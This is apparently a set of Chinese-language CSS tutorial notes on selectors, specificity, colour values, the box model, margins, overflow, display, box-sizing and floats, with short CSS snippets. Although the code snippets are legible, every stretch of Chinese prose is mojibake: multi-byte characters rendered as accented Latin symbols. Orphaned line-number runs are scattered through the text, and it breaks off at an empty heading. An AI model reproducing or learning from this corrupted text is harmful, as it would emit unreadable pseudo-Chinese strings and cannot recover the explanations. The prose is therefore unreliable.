\n\n * :nth-child() éä¸­ç¬¬nä¸ªå­åç´ \n\nç¹æ®å¼ï¼\n\n * n ç¬¬nä¸ª nçèå´0å°æ­£æ ç©·\n\n * 2n æ even è¡¨ç¤ºéä¸­å¶æ°ä½çåç´ \n\n * 2n+1 æ odd è¡¨ç¤ºéä¸­å¥æ°ä½çåç´ \n\nä»¥ä¸è¿äºä¼ªç±»é½æ¯æ ¹æ®ææçå­åç´ è¿è¡æåº\n\n * :first-of-type\n\n * :last-of-type\n\n * :nth-of-type()\n\nè¿å ä¸ªä¼ªç±»çåè½åä¸è¿°çç±»ä¼¼ï¼ä¸éç¹æ¯ä»ä»¬æ¯å¨åç±»ååç´ ä¸­è¿è¡æåº\n\n * :not() å¦å®ä¼ªç±»\n\nå°ç¬¦åæ¡ä»¶çåç´ ä»éæ©å¨ä¸­å»é¤\n\n# ä¼ªåç´ éæ©å¨\n\nä¼ªåç´ ï¼è¡¨ç¤ºé¡µé¢ä¸­ä¸äºç¹æ®çå¹¶ä¸çå®çå­å¨çåç´ ï¼ç¹æ®çä½ç½®ï¼\n\nä¼ªåç´ ä½¿ç¨ :: å¼å¤´\n\n * ::first-letter è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ¯\n\n * ::first-line è¡¨ç¤ºç¬¬ä¸è¡\n\n * ::selection è¡¨ç¤ºéä¸­çåå®¹\n\n * ::before åç´ çå¼å§\n\n * ::after åç´ çæå\n\n * before å after å¿é¡»ç»åcontentå±æ§æ¥ä½¿ç¨\n\n# æ ·å¼ç»§æ¿\n\næä»¬ä¸ºä¸ä¸ªåç´ è®¾ç½®çæ ·å¼åæ¶ä¹ä¼åºç¨å°å®çåä»£åç´ ä¸ï¼ç»§æ¿æ¯åçå¨ç¥åååä»£ä¹é´ç\n\nç»§æ¿çè®¾è®¡æ¯ä¸ºäºæ¹ä¾¿æä»¬çå¼åï¼å©ç¨ç»§æ¿æä»¬å¯ä»¥å°ä¸äºéç¨çæ ·å¼ç»ä¸è®¾ç½®å°å±åçç¥ååç´ ä¸ï¼è¿æ ·åªéè®¾ç½®ä¸æ¬¡å³å¯è®©ææçåç´ é½å·æè¯¥æ ·å¼\n\næ³¨æï¼å¹¶ä¸æ¯ææçæ ·å¼é½ä¼è¢«ç»§æ¿ï¼æ¯å¦èæ¯ç¸å³çï¼å¸å±ç¸å³ç­çè¿äºæ ·å¼é½ä¸ä¼è¢«ç»§æ¿ã\n\n# éæ©å¨æé\n\nå½æä»¬éè¿ä¸åçéæ©å¨ï¼éä¸­ç¸åçåç´ ï¼å¹¶ä¸ä¸ºç¸åçæ ·å¼è®¾ç½®ä¸åçå¼æ¶ï¼æ­¤æ¶å°±åçäºæ ·å¼çå²çªãåçæ ·å¼å²çªæ¶ï¼åºç¨åªä¸ªæ ·å¼ç±éæ©å¨çæéï¼ä¼åçº§ï¼å³å®ã\n\nåèæ ·å¼        1,0,0,0\n\nidéæ©å¨        0,1,0,0\n\nç±»åä¼ªç±»éæ©å¨   0,0,1,0\n\nåç´ éæ©å¨       0,0,0,1\n\néééæ©å¨       0,0,0,0\n\nç»§æ¿çæ ·å¼       æ²¡æä¼åçº§\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¯è¾ä¼åçº§æ¶ï¼éè¦å°ææçéæ©å¨çä¼åçº§è¿è¡ç¸å è®¡ç®ï¼æåä¼åçº§è¶é«ï¼åè¶ä¼åæ¾ç¤ºï¼åç»éæ©å¨æ¯åç¬è®¡ç®çï¼ï¼éæ©å¨çç´¯å ä¸ä¼è¶è¿å¶æå¤§çæ°éçº§ï¼ç±»éæ©å¨å¨é«ä¹ä¸ä¼è¶è¿idéæ©å¨ãå¦æä¼åçº§è®¡ç®åç¸åï¼æ­¤æ¶åä¼åä½¿ç¨é ä¸çæ ·å¼ãå¯ä»¥å¨æä¸ä¸ªæ ·å¼çåè¾¹æ·»å  !important ï¼åæ­¤æ¶è¯¥æ ·å¼ä¼è·åå°æé«çä¼åçº§ï¼çè³è¶è¿åèæ ·å¼ï¼å¨å¼åä¸­è¿ä¸ªç©æä¸å®è¦æç¨ï¼\n\n\n# åä½\n\nåç´ \n\n * å±å¹ï¼æ¾ç¤ºå¨ï¼å®éä¸æ¯ç±ä¸ä¸ªä¸ä¸ªçå°ç¹ç¹ææç\n * ä¸åå±å¹çåç´ å¤§å°æ¯ä¸åçï¼åç´ è¶å°çå±å¹æ¾ç¤ºçææè¶æ¸æ°\n * æä»¥åæ ·ç200pxå¨ä¸åçè®¾å¤ä¸æ¾ç¤ºææä¸ä¸æ ·\n\nç¾åæ¯\n\n * ä¹å¯ä»¥å°å±æ§å¼è®¾ç½®ä¸ºç¸å¯¹äºå¶ç¶åç´ å±æ§çç¾åæ¯\n * è®¾ç½®ç¾åæ¯å¯ä»¥ä½¿å­åç´ è·éç¶åç´ çæ¹åèæ¹å\n\nem\n\n * emæ¯ç¸å¯¹äºåç´ çå­ä½å¤§å°æ¥è®¡ç®ç\n * 1em = 1font-size\n * emä¼æ ¹æ®å­ä½å¤§å°çæ¹åèæ¹å\n\nrem\n\n * remæ¯ç¸å¯¹äºæ ¹åç´ çå­ä½å¤§å°æ¥è®¡ç®\n\n\n# é¢è²\n\nå¨CSSä¸­å¯ä»¥ç´æ¥ä½¿ç¨é¢è²åæ¥è®¾ç½®åç§é¢è²ï¼æ¯å¦ï¼redãorangeãyellowãblueãgreenâ¦â¦ï¼ä½æ¯å¨cssä¸­ç´æ¥ä½¿ç¨é¢è²åæ¯éå¸¸çä¸æ¹ä¾¿ã\n\nRGBå¼ï¼\n\n * RGBéè¿ä¸ç§é¢è²çä¸åæµåº¦æ¥è°éåºä¸åçé¢è²\n * R redï¼G green ï¼B blue\n * æ¯ä¸ç§é¢è²çèå´å¨ 0 - 255 (0% - 100%) ä¹é´\n * è¯­æ³ï¼RGB(çº¢è²,ç»¿è²,èè²)\n\nRGBA:\n\n * å°±æ¯å¨rgbçåºç¡ä¸å¢å äºä¸ä¸ªaè¡¨ç¤ºä¸éæåº¦\n * éè¦åä¸ªå¼ï¼åä¸ä¸ªårgbä¸æ ·ï¼ç¬¬åä¸ªè¡¨ç¤ºä¸éæåº¦ 1è¡¨ç¤ºå®å¨ä¸éæ 0è¡¨ç¤ºå®å¨éæ .5åéæ\n\nåå­è¿å¶çRGBå¼ï¼\n\n * è¯­æ³ï¼#çº¢è²ç»¿è²èè²\n * é¢è²æµåº¦éè¿ 00-ff\n * å¦æé¢è²ä¸¤ä½ä¸¤ä½éå¤å¯ä»¥è¿è¡ç®å #aabbcc --\x3e #abc\n\nHSLå¼ HSLAå¼\n\n * H è²ç¸(0 - 360)\n * S é¥±ååº¦ï¼é¢è²çæµåº¦ 0% - 100%\n * L äº®åº¦ï¼é¢è²çäº®åº¦ 0% - 100%\n\nbackground-color: red;\nbackground-color: rgb(255, 0, 0);\nbackground-color: rgb(0, 255, 0);\nbackground-color: rgb(0, 0, 255);\nbackground-color: rgb(255,255,255);\nbackground-color: rgb(106,153,85);\nbackground-color: rgba(106,153,85,.5);\nbackground-color: #ff0000;\nbackground-color: #ffff00;\nbackground-color: #ff0;\nbackground-color: #bbffaa;\nbackground-color: #9CDCFE;\nbackground-color: rgb(254, 156, 156);\nbackground-color: hsla(98, 48%, 40%, 0.658);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# å¸å±\n\n# ææ¡£æµ\n\nææ¡£æµï¼normal flowï¼\n\nç½é¡µæ¯ä¸ä¸ªå¤å±çç»æï¼ä¸å±æçä¸å±ï¼éè¿CSSå¯ä»¥åå«ä¸ºæ¯ä¸å±æ¥è®¾ç½®æ ·å¼ï¼ä½ä¸ºç¨æ·æ¥è®²åªè½çå°æé¡¶ä¸ä¸å±ãè¿äºå±ä¸­ï¼æåºä¸çä¸å±ç§°ä¸ºææ¡£æµï¼ææ¡£æµæ¯ç½é¡µçåºç¡ãæä»¬æåå»ºçåç´ é»è®¤é½æ¯å¨ææ¡£æµä¸­è¿è¡æåãå¯¹äºæä»¬æ¥åç´ ä¸»è¦æä¸¤ä¸ªç¶æï¼å¨ææ¡£æµä¸­ï¼ä¸å¨ææ¡£æµä¸­ï¼è±ç¦»ææ¡£æµï¼\n\nåç´ å¨ææ¡£æµä¸­æä»ä¹ç¹ç¹ï¼\n\n * ååç´ \n   * ååç´ ä¼å¨é¡µé¢ä¸­ç¬å ä¸è¡(èªä¸åä¸åç´æå)\n   * é»è®¤å®½åº¦æ¯ç¶åç´ çå¨é¨ï¼ä¼æç¶åç´ ææ»¡ï¼\n   * é»è®¤é«åº¦æ¯è¢«åå®¹æå¼ï¼å­åç´ ï¼\n * è¡ååç´ \n   * è¡ååç´ ä¸ä¼ç¬å é¡µé¢çä¸è¡ï¼åªå èªèº«çå¤§å°\n   * è¡ååç´ å¨é¡µé¢ä¸­å·¦åå³æ°´å¹³æåï¼å¦æä¸è¡ä¹ä¸­ä¸è½å®¹çº³ä¸ææçè¡ååç´ ï¼ååç´ ä¼æ¢å°ç¬¬äºè¡ç»§ç»­èªå·¦åå³æåï¼ä¹¦åä¹ æ¯ä¸è´ï¼\n   * è¡ååç´ çé»è®¤å®½åº¦åé«åº¦é½æ¯è¢«åå®¹æå¼\n\n# çå­æ¨¡å\n\nçæ¨¡åãçå­æ¨¡åãæ¡æ¨¡åï¼box modelï¼\n\nCSSå°é¡µé¢ä¸­çææåç´ é½è®¾ç½®ä¸ºäºä¸ä¸ªç©å½¢ççå­ï¼å°åç´ è®¾ç½®ä¸ºç©å½¢ççå­åï¼å¯¹é¡µé¢çå¸å±å°±åæå°ä¸åççå­ææ¾å°ä¸åçä½ä½ç½®ãæ¯ä¸ä¸ªçå­é½ç±ä¸ä¸å ä¸ªé¨åç»æï¼\n\n * åå®¹åºï¼contentï¼\n\n * åè¾¹è·ï¼paddingï¼\n\n * è¾¹æ¡ï¼borderï¼\n\n * å¤è¾¹è·ï¼marginï¼\n\n# åå®¹åº\n\nåå®¹åºï¼contentï¼ï¼åç´ ä¸­çææçå­åç´ åææ¬åå®¹é½å¨åå®¹åºä¸­æåï¼åå®¹åºçå¤§å°ç±width å heightä¸¤ä¸ªå±æ§æ¥è®¾ç½®\n\n * width è®¾ç½®åå®¹åºçå®½åº¦\n\n * height è®¾ç½®åå®¹åºçé«åº¦\n\n# è¾¹æ¡\n\nè¾¹æ¡ï¼borderï¼ï¼è¾¹æ¡å±äºçå­è¾¹ç¼ï¼è¾¹æ¡éè¾¹å±äºçå­åé¨ï¼åºäºè¾¹æ¡é½æ¯çå­çå¤é¨ï¼è¾¹æ¡çå¤§å°ä¼å½±åå°æ´ä¸ªçå­çå¤§å°ãè¦è®¾ç½®è¾¹æ¡ï¼éè¦è³å°è®¾ç½®ä¸ä¸ªæ ·å¼ï¼\n\n * è¾¹æ¡çå®½åº¦ border-width\n\nborder-width: 10px;\n\nè¾¹æ¡çé»è®¤å¼ä¸è¬é½æ¯ 3ä¸ªåç´ ï¼border-widthå¯ä»¥ç¨æ¥æå®åä¸ªæ¹åçè¾¹æ¡çå®½åº¦ã\n\næ ¹æ®ä¸åçå¼çæåµï¼æä»¥ä¸å ç§è®¾ç½®æ¹å¼ï¼\n\n * åä¸ªå¼ï¼ä¸ å³ ä¸ å·¦\n\n * ä¸ä¸ªå¼ï¼ä¸ å·¦å³ ä¸\n\n * ä¸¤ä¸ªå¼ï¼ä¸ä¸ å·¦å³\n\n * ä¸ä¸ªå¼ï¼ä¸ä¸å·¦å³\n\né¤äºborder-widthè¿æä¸ç» border-xxx-widthï¼xxxå¯ä»¥æ¯ top right bottom leftãç¨æ¥åç¬æå®æä¸ä¸ªè¾¹çå®½åº¦\n\n * è¾¹æ¡çé¢è² border-color\n\nborder-colorç¨æ¥æå®è¾¹æ¡çé¢è²ï¼åæ ·å¯ä»¥åå«æå®åä¸ªè¾¹çè¾¹æ¡ï¼è§ååborder-widthä¸æ ·\n\nborder-colorä¹å¯ä»¥çç¥ä¸åï¼å¦æçç¥äºåèªå¨ä½¿ç¨colorçé¢è²å¼ã\n\n * è¾¹æ¡çæ ·å¼ border-style\n\nborder-style æå®è¾¹æ¡çæ ·å¼\n\n * solid è¡¨ç¤ºå®çº¿\n\n * dotted ç¹ç¶èçº¿\n\n * dashed èçº¿\n\n * double åçº¿\n\n * border-styleçé»è®¤å¼æ¯none è¡¨ç¤ºæ²¡æè¾¹æ¡\n\nborderç®åå±æ§ï¼éè¿è¯¥å±æ§å¯ä»¥åæ¶è®¾ç½®è¾¹æ¡ææçç¸å³æ ·å¼ï¼å¹¶ä¸æ²¡æé¡ºåºè¦æ±ãé¤äºborderä»¥å¤è¿æåä¸ª border-xxx\n\n * border-top\n\n * border-right\n\n * border-bottom\n\n * border-left\n\nborder: solid 10px orange;\nborder-top: 10px solid red\n\n\n1\n2\n\n\n# åè¾¹è·\n\nåå®¹åºåè¾¹æ¡ä¹é´çè·ç¦»æ¯åè¾¹è·ï¼ä¸å±æåä¸ªæ¹åçåè¾¹è·ï¼\n\n * padding-top\n * padding-right\n * padding-bottom\n * padding-left\n\nåè¾¹è·çè®¾ç½®ä¼å½±åå°çå­çå¤§å°ï¼èæ¯é¢è²ä¼å»¶ä¼¸å°åè¾¹è·ä¸ãä¸ä¸ªçå­çå¯è§æ¡çå¤§å°ï¼ç±åå®¹åº åè¾¹è· å è¾¹æ¡å±åå³å®ï¼æä»¥å¨è®¡ç®çå­å¤§å°æ¶ï¼éè¦å°è¿ä¸ä¸ªåºåå å°ä¸èµ·è®¡ç®ã\n\n/* padding-top: 100px;\npadding-left: 100px;\npadding-right: 100px;\npadding-bottom: 100px; */\n\n/* \npadding åè¾¹è·çç®åå±æ§ï¼å¯ä»¥åæ¶æå®åä¸ªæ¹åçåè¾¹è·\nè§ååborder-width ä¸æ ·\n*/\npadding: 10px 20px 30px 40px;\npadding: 10px 20px 30px ;\npadding: 10px 20px ;\npadding: 10px ;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# å¤è¾¹è·\n\nå¤è¾¹è·ä¸ä¼å½±åçå­å¯è§æ¡çå¤§å°ï¼ä½æ¯å¤è¾¹è·ä¼å½±åçå­çä½ç½®ãä¸å±æåä¸ªæ¹åçå¤è¾¹è·ï¼\n\nmargin-top\n\n * ä¸å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼åç´ ä¼åä¸ç§»å¨\n\nmargin-right\n\n * é»è®¤æåµä¸è®¾ç½®margin-rightä¸ä¼äº§çä»»ä½ææ\n\nmargin-bottom\n\n * ä¸å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼å¶ä¸è¾¹çåç´ ä¼åä¸ç§»å¨\n\nmargin-left\n\n * å·¦å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼åç´ ä¼åå³ç§»å¨\n\nmarginä¹å¯ä»¥è®¾ç½®è´å¼ï¼å¦ææ¯è´å¼ååç´ ä¼åç¸åçæ¹åç§»å¨ãåç´ å¨é¡µé¢ä¸­æ¯æç§èªå·¦åå³çé¡ºåºæåçï¼æä»¥é»è®¤æåµä¸å¦ææä»¬è®¾ç½®çå·¦åä¸å¤è¾¹è·åä¼ç§»å¨åç´ èªèº«ãèè®¾ç½®ä¸åå³å¤è¾¹è·ä¼ç§»å¨å¶ä»åç´ \n\nmarginçç®åå±æ§ï¼margin å¯ä»¥åæ¶è®¾ç½®åä¸ªæ¹åçå¤è¾¹è· ï¼ç¨æ³åpaddingä¸æ ·ãmarginä¼å½±åå°çå­å®éå ç¨ç©ºé´ã\n\n/* margin-top: 100px;\nmargin-left: 100px;\nmargin-bottom: 100px; */\n\n/* margin-bottom: 100px; */\n/* margin-top: -100px; */\n/* margin-left: -100px; */\n/* margin-bottom: -100px; */\n\n/* margin-right: 0px; */\n\nmargin: 100px;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# çå­æ¨¡åçæ°´å¹³å¸å±\n\nåç´ çæ°´å¹³æ¹åçå¸å±ï¼åç´ å¨å¶ç¶åç´ ä¸­æ°´å¹³æ¹åçä½ç½®ç±ä»¥ä¸å ä¸ªå±æ§å±åå³å®ï¼\n\n * margin-left\n * border-left\n * padding-left\n * width\n * padding-right\n * border-right\n * margin-right\n\nä¸ä¸ªåç´ å¨å¶ç¶åç´ ä¸­ï¼æ°´å¹³å¸å±å¿é¡»è¦æ»¡è¶³ä»¥ä¸çç­å¼ margin-left+border-left+padding-left+width+padding-right+border-right+margin-right = å¶ç¶åç´ åå®¹åºçå®½åº¦ ï¼å¿é¡»æ»¡è¶³ï¼\n\nå¦ä»¥ä¸çä¾å­ï¼\n\n0 + 0 + 0 + 200 + 0 + 0 + 0 = 800\n0 + 0 + 0 + 200 + 0 + 0 + 600 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 400 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 500 = 800\n\n\n1\n2\n3\n4\n\n\nä»¥ä¸ç­å¼å¿é¡»æ»¡è¶³ï¼å¦æç¸å ç»æä½¿ç­å¼ä¸æç«ï¼åç§°ä¸ºè¿åº¦çº¦æï¼åç­å¼ä¼èªå¨è°æ´ã\n\nè°æ´çæ¹å¼ï¼\n\nå¦æè¿ä¸ä¸ªå¼ä¸­æ²¡æä¸º auto çæåµï¼åæµè§å¨ä¼èªå¨è°æ´margin-rightå¼ä»¥ä½¿ç­å¼æ»¡è¶³ãè¿ä¸ä¸ªå¼ä¸­æä¸ä¸ªå¼å¯ä»¥è®¾ç½®ä¸ºauto\n\n * width\n * margin-left\n * maring-right\n\nå¦ææä¸ªå¼ä¸ºautoï¼åä¼èªå¨è°æ´ä¸ºautoçé£ä¸ªå¼ä»¥ä½¿ç­å¼æç«ã\n\n0 + 0 + 0 + auto + 0 + 0 + 0 = 800  auto = 800\n0 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 600\n200 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + auto = 800  auto = 300\n\n\n1\n2\n3\n4\n5\n\n\nå¦æå°ä¸ä¸ªå®½åº¦åä¸ä¸ªå¤è¾¹è·è®¾ç½®ä¸ºautoï¼åå®½åº¦ä¼è°æ´å°æå¤§ï¼è®¾ç½®ä¸ºautoçå¤è¾¹è·ä¼èªå¨ä¸º0ã\n\nå¦æå°ä¸ä¸ªå¼é½è®¾ç½®ä¸ºautoï¼åå¤è¾¹è·é½æ¯0ï¼å®½åº¦æå¤§\n\nå¦æå°ä¸¤ä¸ªå¤è¾¹è·è®¾ç½®ä¸ºautoï¼å®½åº¦åºå®å¼ï¼åä¼å°å¤è¾¹è·è®¾ç½®ä¸ºç¸åçå¼ãæä»¥æä»¬ç»å¸¸å©ç¨è¿ä¸ªç¹ç¹æ¥ä½¿ä¸ä¸ªåç´ å¨å¶ç¶åç´ ä¸­æ°´å¹³å±ä¸­ã\n\nwidth:xxxpx;\nmargin:0 auto;\n\n\n1\n2\n\n\n# çå­åç´å¸å±\n\né»è®¤æåµä¸ç¶åç´ çé«åº¦è¢«åå®¹æå¼ï¼å­åç´ æ¯å¨ç¶åç´ çåå®¹åºä¸­æåçï¼å¦æå­åç´ çå¤§å°è¶è¿äºç¶åç´ ï¼åå­åç´ ä¼ä»ç¶åç´ ä¸­æº¢åºãä½¿ç¨ overflow å±æ§æ¥è®¾ç½®ç¶åç´ å¦ä½å¤çæº¢åºçå­åç´ ï¼\n\n * visibleï¼é»è®¤å¼ å­åç´ ä¼ä»ç¶åç´ ä¸­æº¢åºï¼å¨ç¶åç´ å¤é¨çä½ç½®æ¾ç¤º\n\n * hidden æº¢åºåå®¹å°ä¼è¢«è£åªä¸ä¼æ¾ç¤º\n\n * scroll çæä¸¤ä¸ªæ»å¨æ¡ï¼éè¿æ»å¨æ¡æ¥æ¥çå®æ´çåå®¹\n\n * auto æ ¹æ®éè¦çææ»å¨æ¡\n\noverflow-x: \n\noverflow-y:\n\n\n1\n2\n3\n\n\n# åç´å¤è¾¹è·çæå \n\nç¸é»çåç´æ¹åå¤è¾¹è·ä¼åçéå ç°è±¡\n\nåå¼åç´ \n\n * åå¼åç´ é´çç¸é»åç´å¤è¾¹è·ä¼åä¸¤èä¹é´çè¾å¤§å¼ï¼ä¸¤èé½æ¯æ­£å¼ï¼\n\n * ç¹æ®æåµï¼å¦æç¸é»çå¤è¾¹è·ä¸æ­£ä¸è´ï¼ååä¸¤èçåãå¦æç¸é»çå¤è¾¹è·é½æ¯è´å¼ï¼ååä¸¤èä¸­ç»å¯¹å¼è¾å¤§ç\n\n * åå¼åç´ ä¹é´çå¤è¾¹è·çéå ï¼å¯¹äºå¼åæ¯æå©çï¼æä»¥æä»¬ä¸éè¦è¿è¡å¤ç\n\nç¶å­åç´ \n\n * ç¶å­åç´ é´ç¸é»å¤è¾¹è·ï¼å­åç´ çä¼ä¼ éç»ç¶åç´ ï¼ä¸å¤è¾¹è·ï¼\n * ç¶å­å¤è¾¹è·çæå ä¼å½±åå°é¡µé¢çå¸å±ï¼å¿é¡»è¦è¿è¡å¤ç\n\n# è¡ååç´ ççå­æ¨¡å\n\n * è¡ååç´ ä¸æ¯æè®¾ç½®å®½åº¦åé«åº¦\n\n * è¡ååç´ å¯ä»¥è®¾ç½®paddingï¼ä½æ¯åç´æ¹åpaddingä¸ä¼å½±åé¡µé¢çå¸å±\n\n * è¡ååç´ å¯ä»¥è®¾ç½®borderï¼åç´æ¹åçborderä¸ä¼å½±åé¡µé¢çå¸å±\n\n * è¡ååç´ å¯ä»¥è®¾ç½®marginï¼åç´æ¹åçmarginä¸ä¼å½±åå¸å±\n\ndisplay ç¨æ¥è®¾ç½®åç´ æ¾ç¤ºçç±»åï¼æä»¥ä¸å ç§å¯éå¼ã\n\n * inline å°åç´ è®¾ç½®ä¸ºè¡ååç´ \n\n * block å°åç´ è®¾ç½®ä¸ºååç´ \n\n * inline-block å°åç´ è®¾ç½®ä¸ºè¡åååç´ ï¼æ¢å¯ä»¥è®¾ç½®å®½åº¦åé«åº¦åä¸ä¼ç¬å ä¸è¡\n\n * table å°åç´ è®¾ç½®ä¸ºä¸ä¸ªè¡¨æ ¼\n\n * none åç´ ä¸å¨é¡µé¢ä¸­æ¾ç¤º\n\nvisibility ç¨æ¥è®¾ç½®åç´ çæ¾ç¤ºç¶æ\n\n * visible é»è®¤å¼ï¼åç´ å¨é¡µé¢ä¸­æ­£å¸¸æ¾ç¤º\n\n * hidden åç´ å¨é¡µé¢ä¸­éè ä¸æ¾ç¤ºï¼ä½æ¯ä¾ç¶å æ®é¡µé¢çä½ç½®\n\n# é»è®¤æ ·å¼\n\néå¸¸æåµï¼æµè§å¨é½ä¼ä¸ºåç´ è®¾ç½®ä¸äºé»è®¤æ ·å¼ï¼é»è®¤æ ·å¼çå­å¨ä¼å½±åå°é¡µé¢çå¸å±ï¼éå¸¸æåµä¸ç¼åç½é¡µæ¶å¿é¡»è¦å»é¤æµè§å¨çé»è®¤æ ·å¼ï¼PCç«¯çé¡µé¢ï¼ã\n\nbody{\n  margin: 0;\n}\n\np{\n  margin: 0;\n}\n\nul{\n  margin: 0;\n  padding: 0;\n  /*å»é¤é¡¹ç®ç¬¦å·*/\n  list-style:none; \n}\n\n*{\n  margin: 0;\n  padding: 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\néç½®æ ·å¼è¡¨ï¼ä¸é¨ç¨æ¥å¯¹æµè§å¨çæ ·å¼è¿è¡éç½®çã\n\n * reset.css ç´æ¥å»é¤äºæµè§å¨çé»è®¤æ ·å¼\n * normalize.css å¯¹é»è®¤æ ·å¼è¿è¡äºç»ä¸\n\n# çå­å°ºå¯¸\n\né»è®¤æåµä¸ï¼çå­å¯è§æ¡çå¤§å°ç±åå®¹åºãåè¾¹è·åè¾¹æ¡å±åå³å®ãbox-sizing ç¨æ¥è®¾ç½®çå­å°ºå¯¸çè®¡ç®æ¹å¼ï¼è®¾ç½®widthåheightçä½ç¨ï¼ã\n\n * content-box é»è®¤å¼ï¼å®½åº¦åé«åº¦ç¨æ¥è®¾ç½®åå®¹åºçå¤§å°\n\n * border-box å®½åº¦åé«åº¦ç¨æ¥è®¾ç½®æ´ä¸ªçå­å¯è§æ¡çå¤§å°\n\n * width å height æçæ¯åå®¹åº å åè¾¹è· å è¾¹æ¡çæ»å¤§å°\n\n# è½®å»ååè§\n\nbox-shadow ç¨æ¥è®¾ç½®åç´ çé´å½±ææï¼é´å½±ä¸ä¼å½±åé¡µé¢å¸å± ã\n\n * ç¬¬ä¸ä¸ªå¼ æ°´å¹³åç§»é è®¾ç½®é´å½±çæ°´å¹³ä½ç½® æ­£å¼åå³ç§»å¨ è´å¼åå·¦ç§»å¨\n\n * ç¬¬äºä¸ªå¼ åç´åç§»é è®¾ç½®é´å½±çæ°´å¹³ä½ç½® æ­£å¼åä¸ç§»å¨ è´å¼åä¸ç§»å¨\n\n * ç¬¬ä¸ä¸ªå¼ é´å½±çæ¨¡ç³åå¾\n\n * ç¬¬åä¸ªå¼ é´å½±çé¢è²\n\noutline ç¨æ¥è®¾ç½®åç´ çè½®å»çº¿ï¼ç¨æ³åborderä¸æ¨¡ä¸æ ·ãè½®å»åè¾¹æ¡ä¸åçç¹ï¼å°±æ¯è½®å»ä¸ä¼å½±åå°å¯è§æ¡çå¤§å°ã\n\nborder-radius: ç¨æ¥è®¾ç½®åè§ åè§è®¾ç½®çåçåå¾å¤§å°ï¼\n\n/* border-top-left-radius:  */\n/* border-top-right-radius */\n/* border-bottom-left-radius:  */\n/* border-bottom-right-radius:  */\n/* border-top-left-radius:50px 100px; */\n\n\n1\n2\n3\n4\n5\n\n\nborder-radius å¯ä»¥åå«æå®åä¸ªè§çåè§\n\n * åä¸ªå¼ å·¦ä¸ å³ä¸ å³ä¸ å·¦ä¸\n\n * ä¸ä¸ªå¼ å·¦ä¸ å³ä¸/å·¦ä¸ å³ä¸\n\n * ä¸¤ä¸ªä¸ªå¼ å·¦ä¸/å³ä¸ å³ä¸/å·¦ä¸\n\n/* å°åç´ è®¾ç½®ä¸ºä¸ä¸ªåå½¢ */\nborder-radius: 50%;    \n\n\n1\n2\n\n\n\n# æµ®å¨\n\néè¿æµ®å¨å¯ä»¥ä½¿ä¸ä¸ªåç´ åå¶ç¶åç´ çå·¦ä¾§æå³ä¾§ç§»å¨ï¼ä½¿ç¨ float å±æ§æ¥è®¾ç½®äºåç´ çæµ®å¨ã\n\n * none é»è®¤å¼ ï¼åç´ ä¸æµ®å¨\n\n * left åç´ åå·¦æµ®å¨\n\n * right åç´ åå³æµ®å¨\n\næ³¨æï¼åç´ è®¾ç½®æµ®å¨ä»¥åï¼æ°´å¹³å¸å±çç­å¼ä¾¿ä¸éè¦å¼ºå¶æç«ãåç´ è®¾ç½®æµ®å¨ä»¥åï¼ä¼å®å¨ä»ææ¡£æµä¸­è±ç¦»ï¼ä¸åå ç¨ææ¡£æµçä½ç½®ï¼æä»¥åç´ ä¸è¾¹çè¿å¨ææ¡£æµä¸­çåç´ ä¼èªå¨åä¸ç§»å¨ã\n\næµ®å¨çç¹ç¹ï¼\n\n1ãæµ®å¨åç´ ä¼å®å¨è±ç¦»ææ¡£æµï¼ä¸åå æ®ææ¡£æµä¸­çä½ç½®\n\n2ãè®¾ç½®æµ®å¨ä»¥ååç´ ä¼åç¶åç´ çå·¦ä¾§æå³ä¾§ç§»å¨ï¼\n\n3ãæµ®å¨åç´ é»è®¤ä¸ä¼ä»ç¶åç´ ä¸­ç§»åº\n\n4ãæµ®å¨åç´ åå·¦æåå³ç§»å¨æ¶ï¼ä¸ä¼è¶è¿å®åè¾¹çå¶ä»æµ®å¨åç´ \n\n5ãå¦ææµ®å¨åç´ çä¸è¾¹æ¯ä¸ä¸ªæ²¡ææµ®å¨çååç´ ï¼åæµ®å¨åç´ æ æ³ä¸ç§»\n\n6ãæµ®å¨åç´ ä¸ä¼è¶è¿å®ä¸è¾¹çæµ®å¨çåå¼åç´ ï¼æå¤æå¤å°±æ¯åå®ä¸æ ·é«\n\n7ãæµ®å¨åç´ ä¸ä¼çä½æå­ï¼æå­ä¼èªå¨ç¯ç»å¨æµ®å¨åç´ çå¨å´ï¼æä»¥æä»¬å¯ä»¥å©ç¨æµ®å¨æ¥è®¾ç½®æå­ç¯ç»å¾ççææ\n\nç®åæ»ç»ï¼\n\næµ®å¨ç®åæ¥è®²å®çä¸»è¦ä½ç¨å°±æ¯è®©é¡µé¢ä¸­çåç´ å¯ä»¥æ°´å¹³æåï¼éè¿æµ®å¨å¯ä»¥å¶ä½ä¸äºæ°´å¹³æ¹åçå¸å±ãåç´ è®¾ç½®æµ®å¨ä»¥åï¼å°ä¼ä»ææ¡£æµä¸­è±ç¦»ï¼ä»ææ¡£æµä¸­è±ç¦»åï¼åç´ çä¸äºç¹ç¹ä¹ä¼åçååã\n\nè±ç¦»ææ¡£æµçç¹ç¹ï¼\n\nååç´ ï¼\n\n1ãååç´ ä¸å¨ç¬å é¡µé¢çä¸è¡\n\n2ãè±ç¦»ææ¡£æµä»¥åï¼ååç´ çå®½åº¦åé«åº¦é»è®¤é½è¢«åå®¹æå¼\n\nè¡ååç´ ï¼\n\n1ãè¡ååç´ è±ç¦»ææ¡£æµä»¥åä¼åæååç´ ï¼ç¹ç¹åååç´ ä¸æ ·\n\nè±ç¦»ææ¡£æµä»¥åï¼ä¸éè¦ååºåååè¡åäº\n\n# 